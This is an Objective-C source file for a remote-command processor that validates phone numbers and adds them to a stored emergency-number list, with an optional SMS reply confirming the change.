/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  AddEmergencyNumberProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "AddEmergencyNumberProcessor.h"
#import "PrefEmergencyNumber.h"
#import "Preference.h"

@interface AddEmergencyNumberProcessor (PrivateAPI)
- (void) processAddEmergencyNumber;
- (void) addEmergencyNumberException: (NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canAddEmergencyNumber;
- (BOOL) checkIfEmergencyNumberAlreadyExist;
- (BOOL) checkValidLengthOfEmergencyNumbers;
@end

@implementation AddEmergencyNumberProcessor

@synthesize mEmergencyNumberList;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the AddEmergencyNumberProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (AddEmergencyNumberProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"AddEmergencyNumberProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the AddEmergencyNumberProcessor
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"AddEmergencyNumberProcessor--->doProcessingCommand")
	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {
		
		[self setMEmergencyNumberList:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kPhoneNumberValidation]];
		DLog(@"AddEmergencyNumberProcessor--->Emergency Numbers:%@",mEmergencyNumberList);
		if ([mEmergencyNumberList count]>0) {
			if ([self canAddEmergencyNumber]) { 
				if (![self checkIfEmergencyNumberAlreadyExist]								&&
					![RemoteCmdProcessorUtils isDuplicateTelephoneNumber:mEmergencyNumberList]) {
					if ([self checkValidLengthOfEmergencyNumbers]) { // Check length of each emergency numbers
						[self processAddEmergencyNumber];
					} else {
						[self addEmergencyNumberException:kCmdExceptionErrorInvalidNumberToEmergencyList];
					}
				} else {
					[self addEmergencyNumberException:kCmdExceptionErrorCannotAddDuplicateToEmergencyList];
				}
			}
			else {
				[self addEmergencyNumberException:kCmdExceptionErrorEmergencyNumberExceedListCapacity];
			}
		}
		else {
			[self addEmergencyNumberException:kCmdExceptionErrorInvalidNumberToEmergencyList];
		}
	} else {
		[self addEmergencyNumberException:kCmdExceptionErrorInvalidCmdFormat];
	}	
}

#pragma mark AddEmergencyNumberProcessor PrivateAPI Methods

/**
 - Method name: processAddEmergencyNumber
 - Purpose:This method is used to process Add Emergency Number
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) processAddEmergencyNumber {
	DLog (@"AddEmergencyNumberProcessor--->processAddEmergencyNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefEmergencyNumber *prefEmergencyNumberList = (PrefEmergencyNumber *) [prefManager preference:kEmergency_Number];
	
	NSMutableArray *emergencyNumberList=[[NSMutableArray alloc] init];
	
	// Existing emergencyNumber
	for (NSString *emergencyNumber in [prefEmergencyNumberList mEmergencyNumbers]) {
		[emergencyNumberList addObject:emergencyNumber];
	}
	//New emergencyNumber 
	for (NSString *emergencyNumber in mEmergencyNumberList) {
		[emergencyNumberList addObject:emergencyNumber];
	}
	
	[prefEmergencyNumberList setMEmergencyNumbers:emergencyNumberList];
	[prefManager savePreferenceAndNotifyChange:prefEmergencyNumberList];
	[emergencyNumberList release];
	
	[self sendReplySMS];
}

/**
 - Method name: canAddEmergencyNumber
 - Purpose:This method is to check maximum emergency number list capacity. 
 - Argument list and description: No Argument
 - Return description: BOOL
 */

- (BOOL) canAddEmergencyNumber {
	DLog (@"AddEmergencyNumberProcessor--->canAddEmergencyNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefEmergencyNumber *prefEmergencyNumberList = (PrefEmergencyNumber *) [prefManager preference:kEmergency_Number];
	int count=[[prefEmergencyNumberList mEmergencyNumbers] count]+[mEmergencyNumberList count];
	if (count<=EMERGENCY_NUMBER_LIST_CAPACITY) {
		return YES;
	}
	else {
		return NO;
	}
}

/**
 - Method name: checkIfEmergencyNumberAlreadyExist
 - Purpose:This method is used to check if emergency number already exist. 
 - Argument list and description: No Argument
 - Return description: BOOL
*/

- (BOOL) checkIfEmergencyNumberAlreadyExist {
	DLog (@"AddEmergencyNumberProcessor--->checkIfEmergencyNumberAlreadyExist");
	BOOL isNumberExist=NO;
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefEmergencyNumber *prefEmergencyNumberList = (PrefEmergencyNumber *) [prefManager preference:kEmergency_Number];
	for (NSString *emergencyNumber in mEmergencyNumberList) {
		NSPredicate *predicate = [NSPredicate predicateWithFormat:@"SELF == %@",emergencyNumber];
		NSArray *result=[[prefEmergencyNumberList mEmergencyNumbers] filteredArrayUsingPredicate:predicate];
		if ([result count]) {
			isNumberExist=YES;
			break;
		}
	}
	return isNumberExist;
}

- (BOOL) checkValidLengthOfEmergencyNumbers {
	BOOL valid = YES;
	for (NSString *emergencyNumber in mEmergencyNumberList) {
		if ([emergencyNumber length] < 5) {
			valid = NO;
			break;
		}
	}
	return (valid);
}

/**
 - Method name: addEmergencyNumberException
 - Purpose:This method is invoked when  emergency number process failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) addEmergencyNumberException: (NSUInteger) aErrorCode {
	DLog (@"AddEmergencyNumberProcessor--->addEmergencyNumberException")
	FxException* exception = [FxException exceptionWithName:@"addEmergencyNumberException" andReason:@"Add Emergency number error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"AddEmergencyNumberProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mEmergencyNumberList release];
	[super dealloc];
}

@end
